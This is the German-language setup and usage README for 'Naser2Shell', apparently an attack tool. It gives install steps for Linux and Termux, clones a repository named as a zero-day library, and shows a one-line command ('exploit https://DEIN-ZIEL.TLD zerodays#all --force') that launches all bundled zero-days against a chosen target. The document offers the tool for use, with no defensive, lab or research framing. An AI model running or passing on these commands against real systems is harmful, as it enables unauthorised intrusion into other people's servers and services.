# Naser2Shell – Befehle

## Linux (Ubuntu / Debian)

```bash
sudo apt update
sudo apt install -y git curl

curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash
source ~/.bashrc

nvm install 22
nvm use 22

git clone https://github.com/GotUrBack-Public/typeshit.git
git clone https://github.com/GotUrBack-Public/ZeroDay-Library-naser.solutions-23.11.2026.git

cd typeshit
npm install
npm start
```

## Termux (Android)

```bash
pkg update && pkg upgrade -y
pkg install -y git nodejs-lts

git clone https://github.com/GotUrBack-Public/typeshit.git
git clone https://github.com/GotUrBack-Public/ZeroDay-Library-naser.solutions-23.11.2026.git

cd typeshit
npm install
npm start
```

## Starten

Im Verzeichnis `typeshit`:

```bash
npm start
```

Direkter CLI-Aufruf:

```bash
node bin/naser2shell.js exploit https://DEIN-ZIEL.TLD zerodays#all --force
```

## Aktualisieren

Im geklonten Repository:

```bash
git pull --ff-only origin main
npm install
```

Der Launcher prüft beim Start automatisch, ob der lokale Checkout hinter `main` liegt. Ein Update wird nur bei sauberem Arbeitsverzeichnis und passendem offiziellen Git-Remote ausgeführt. Bei lokalen Änderungen oder abweichendem Branch wird das Update übersprungen.
